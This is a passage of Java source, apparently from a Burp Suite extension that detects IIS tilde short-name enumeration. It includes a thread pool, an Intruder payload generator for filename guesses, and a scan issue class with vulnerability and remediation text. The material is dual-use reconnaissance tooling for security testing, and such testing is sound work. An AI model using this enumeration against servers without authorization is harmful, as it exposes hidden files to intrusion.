                taskQueue.clear();
                interrupt();
            }
        }

        /**
         * Closes this ThreadPool and waits for all running threads to finish. Any
         * waiting tasks are executed.
         */
        public void join()
        {
            // notify all waiting threads that this ThreadPool is no
            // longer alive
            synchronized (this)
            {
                isAlive = false;
                notifyAll();
            }

            // wait for all threads to finish
            Thread[] threads = new Thread[activeCount()];
            int count = enumerate(threads);
            for (int i = 0; i < count; i++)
            {
                try
                {
                    threads[i].join();
                }
                catch (InterruptedException ex) {}
            }
        }

        /**
         * A PooledThread is a Thread in a ThreadPool group, designed to run tasks
         * (Runnables).
         */
        private class PooledThread extends Thread
        {

            public PooledThread()
            {
                super(ThreadPool.this, "PooledThread-" + (threadID++));
            }

            public void run()
            {
                while (!isInterrupted())
                {

                    // get a task to run
                    Runnable task = null;
                    try
                    {
                        task = getTask();
                    }
                    catch (InterruptedException ex) {}

                    // if getTask() returned null or was interrupted,
                    // close this thread by returning.
                    if (task == null)
                    {
                        return;
                    }

                    // run the task, and eat any exceptions it throws
                    try
                    {
                        task.run();
                    }
                    catch (Throwable t)
                    {
                        uncaughtException(this, t);
                    }
                }
            }
        }
    }
}

// class to handle Intruder payload generator for filename guessing from scan results
class IntruderPayloadGenerator implements IIntruderPayloadGenerator
{
    private List<String> payloads;
    int payloadIndex;

    public IntruderPayloadGenerator(List<String> payloads)
    {
        this.payloads = payloads;
    }

    @Override
    public boolean hasMorePayloads()
    {
        return payloadIndex < payloads.size();
    }

    @Override
    public byte[] getNextPayload(byte[] baseValue)
    {
        byte[] payload = payloads.get(payloadIndex).getBytes();
        payloadIndex++;
        return payload;
    }

    @Override
    public void reset()
    {
        payloadIndex = 0;
    }
}

// custom issue class
class CustomScanIssue implements IScanIssue
{
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;

    public CustomScanIssue(IHttpService httpService, String url, IHttpRequestResponse[] httpMessages)
    {
        try
        {
            this.httpService = httpService;
            this.url = new URL(url);
            this.httpMessages = httpMessages;
        }
        catch (Exception e)
        {
            throw new RuntimeException("error while adding issue to Burp Issue Activity");
        }
    }
    
    @Override
    public URL getUrl()
    {
        return url;
    }

    @Override
    public String getIssueName()
    {
        return "IIS Tilde Enumeration";
    }

    @Override
    public int getIssueType()
    {
        return 0;
    }

    @Override
    public String getSeverity()
    {
        return "Medium";
    }

    @Override
    public String getConfidence()
    {
        return "Certain";
    }

    @Override
    public String getIssueBackground()
    {
        return "https://www.acunetix.com/vulnerabilities/web/microsoft-iis-tilde-directory-enumeration/";
    }

    @Override
    public String getRemediationBackground()
    {
        return "https://www.tenable.com/plugins/was/112442";
    }

    @Override
    public String getIssueDetail()
    {
        return "Microsoft Internet Information Server (IIS) suffers from a vulnerability which allows the detection of short names of files and directories which have en equivalent in the 8.3 version of the file naming scheme. By crafting specific requests containing the tilde '~‘ character, an attacker could leverage this vulnerability to find files or directories that are normally not visible and gain access to sensitive information. Given the underlying filesystem calls generated by the remote server, the attacker could also attempt a denial of service on the target application.";
    }

    @Override
    public String getRemediationDetail()
    {
        return "As a workaround, disable the 8.3 file and directories name creation, manually remove names already present in the fileystem and ensure that URL requests containing the tilde character (and its unicode equivalences) are discarded before reaching the IIS server. If possible, upgrade to the latest version of the .NET framework and IIS server.";
    }

    @Override
    public IHttpRequestResponse[] getHttpMessages()
    {
        return httpMessages;
    }

    @Override
    public IHttpService getHttpService()
    {
        return httpService;
    }
}

// class to handle child killing in multithreading
class KillableThread extends Thread
{
    public KillableThread()
    {
        super();
    }

    public void kill()
    {
        // there goes additional override code to kill child threads inside the class
        this.stop();
    }
}


// class containing some static vars and methods for utilities
class Utils{
    public static boolean checkDelta(int l1, int l2, int delta)
    {
        if (delta < 0)
        {
            return false;
        }

        if (Math.abs(l1 - l2) <= delta)
        {
            return true;
        }

        return false;
    }

    public static String urlEncode(String unquoted)
    {
        try
        {
            return URLEncoder.encode(unquoted, "UTF-8").replace("*", "%2A");
        }
        catch (UnsupportedEncodingException e)
        {
            throw new RuntimeException("unsupported encoding while url encoding");
        }
    }

    public static String tree(String str, int level)
    {
        String dentSpace = new String(new char[level]).replace("\0", "  ");
        return dentSpace + "|_ " + str;
    }

    public static List<String> readFile(File file)
    {
        List<String> fileContent = new ArrayList<String>();
        
        try (BufferedReader br = new BufferedReader(new FileReader(file)))
        {
            String line;
            while ((line = br.readLine()) != null)
            {
                fileContent.add(line);
            }
        }
        
        catch (FileNotFoundException e)
        {
            return null;
        }
        
        catch (IOException e)
        {
            return null;
        }
        
        return fileContent;
    }
}
